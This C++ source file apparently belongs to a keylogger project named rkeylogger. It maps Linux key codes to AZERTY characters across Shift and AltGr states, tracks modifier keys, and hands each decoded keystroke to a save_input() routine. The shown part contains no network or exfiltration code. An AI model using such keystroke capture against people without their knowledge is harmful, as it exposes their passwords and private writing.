#include <iostream>
#include <unordered_map>
#include <string>

#include "rkeylogger.h"

//TODO: Check the init value with termios.h or something else
bool
    is_shift_pressed = false, 
    is_altgr_pressed = false, 
    is_capslock_pressed = false;

// Mapper for basic azerty 
// { KEY_CODE, { NORMAL_VALUE, IF_SHIFT_IS_PRESSED, IF_ALTGR_IS_PRESSED }}
std::unordered_map<int, KeyValue> keyboard_layout = {
    //1st line of keyboard
    {1, { "ESC", "ESC", "ESC"}}, //TODO: F1 -> F2 ...

    //2nd line of keyboard
    {41,    {"²",   "~",    "¬"}},
    {2,     {"&",   "1",    "¹"}},
    {3,     {"é",   "2",    "~"}},
    {3,     {"é",   "2",    "~"}},
    {4,     {"\"",  "3",    "#"}},
    {5,     {"'",   "4",    "{"}},
    {6,     {"(",   "5",    "["}},
    {7,     {"-",   "6",    "|"}},
    {8,     {"è",   "7",    "`"}},
    {9,     {"_",   "8",    "\\"}},
    {10,    {"ç",   "9",    "^"}},
    {11,    {"à",   "0",    "@"}},
    {12,    {")",   "°",    "]"}},
    {13,    {"=",   "+",    "}"}},
    {14,    {"KEY_BACKSPACE",   "KEY_BACKSPACE",    "KEY_BACKSPACE"}},
    
    //3rd line of keyboard
    {15,    {"KEY_TAB",   "KEY_TAB",    "KEY_TAB"}},
    {16,    {"a",   "A",    "a"}},
    {17,    {"z",   "Z",    "z"}},
    {18,    {"e",   "E",    "€"}},
    {19,    {"r",   "R",    "r"}},
    {20,    {"t",   "T",    "t"}},
    {21,    {"y",   "Y",    "y"}},
    {22,    {"u",   "U",    "u"}},
    {23,    {"i",   "I",    "i"}},
    {24,    {"o",   "O",    "o"}},
    {25,    {"p",   "P",    "P"}},
    {26,    {"^",   "¨",    "^"}},
    {27,    {"$",   "£",    "¤"}},
    {43,    {"*",   "µ",    "*"}},

    //4th line of keyboard
    {58,    {"KEY_CAPSLOCK",   "KEY_CAPSLOCK",    "KEY_CAPSLOCK"}},
    {30,    {"q",   "Q",    "q"}},
    {31,    {"s",   "S",    "s"}},
    {32,    {"d",   "D",    "d"}},
    {33,    {"f",   "F",    "f"}},
    {34,    {"g",   "G",    "g"}},
    {35,    {"h",   "H",    "h"}},
    {36,    {"j",   "J",    "j"}},
    {37,    {"k",   "K",    "k"}},
    {38,    {"l",   "L",    "l"}},
    {39,    {"m",   "M",    "m"}},
    {40,    {"ù",   "%",    "ù"}},
    {28,    {"KEY_ENTER",   "KEY_ENTER",    "KEY_ENTER"}},

    //5th line of keyboard
    {42,    {"KEY_LEFTSHIFT",   "KEY_LEFTSHIFT",    "KEY_LEFTSHIFT"}},
    {44,    {"w",   "W",    "w"}},
    {45,    {"x",   "X",    "x"}},
    {46,    {"c",   "C",    "c"}},
    {47,    {"v",   "V",    "v"}},
    {48,    {"b",   "B",    "b"}},
    {49,    {"n",   "N",    "n"}},
    {50,    {",",   "?",    ","}},
    {51,    {";",   ".",    ";"}},
    {52,    {":",   "/",    ":"}},
    {53,    {"!",   "§",    "!"}},
    {54,    {"KEY_RIGHTSHIFT",   "KEY_RIGHTSHIFT",    "KEY_RIGHTSHIFT"}},

    //6th line of keyboard
    {57,    {" ",   " ",    " "}}, //KEY_SPACE
    {100,    {"KEY_RIGHTALT",   "KEY_RIGHTALT",    "KEY_RIGHTALT"}},
};

bool emit_code(int code){
    if(is_capslock_pressed || is_shift_pressed)
        return save_input(keyboard_layout[code].shift);
    if(is_altgr_pressed)
        return save_input(keyboard_layout[code].altgr);
    return save_input(keyboard_layout[code].normal);
}

MapSaveStatus map_code(int code, int value){
    bool status = value == 1;
    std::cout << "[ KEY_EVENT ]: code -> " << code << "\n";

    switch(code){
        case 1:
            return MapSaveStatus::END;
        case 100:
            is_altgr_pressed = status;
            break;
        case 58:
            is_capslock_pressed = status;
            break;
        case 42:
        case 54:
            is_shift_pressed = status;
            break;
        default:
            if((status && code != 29 && code > 1 && code <= 54) || code == 57){
                if(!emit_code(code))
                    return MapSaveStatus::ERROR;
            }
            break;
    }

    return MapSaveStatus::SUCCESS; 
}